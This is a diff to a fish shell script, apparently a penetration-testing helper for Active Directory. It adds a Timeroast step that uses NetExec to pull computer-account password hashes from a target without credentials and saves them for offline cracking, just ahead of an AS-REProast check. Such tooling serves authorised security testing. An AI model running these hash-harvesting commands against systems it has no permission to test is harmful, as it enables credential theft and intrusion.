@@ -201,6 +201,20 @@ Examples:
     # Cleanup temp file
     rm -f $shares_output
 
+    ezpz_title "Looking for exploitable accounts..."
+
+    # Timeroast - works without authentication
+    ezpz_header "Searching for Timeroastable accounts"
+    set time_file "$target"_time.hash
+    if test -n "$domain"
+        set time_file "$domain"_time.hash
+    end
+    ezpz_cmd "nxc smb $_flag_target -M timeroast"
+    nxc smb $_flag_target -M timeroast 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
+    if test -s $time_file
+        ezpz_info "Saving hashes to $time_file"
+    end
+
     # Test for exploitable accounts if user files exist
     set users_file_full "$target"_users.txt
     set users_file_mini "$target"_users-mini.txt
@@ -217,8 +231,6 @@ Examples:
     end
 
     if test -n "$active_users_file"
-        ezpz_title "Looking for exploitable accounts..."
-
         ezpz_header "Searching for AS-REProastable accounts"
         set asrep_file "$target"_asrep.hash
         if test -n "$domain"
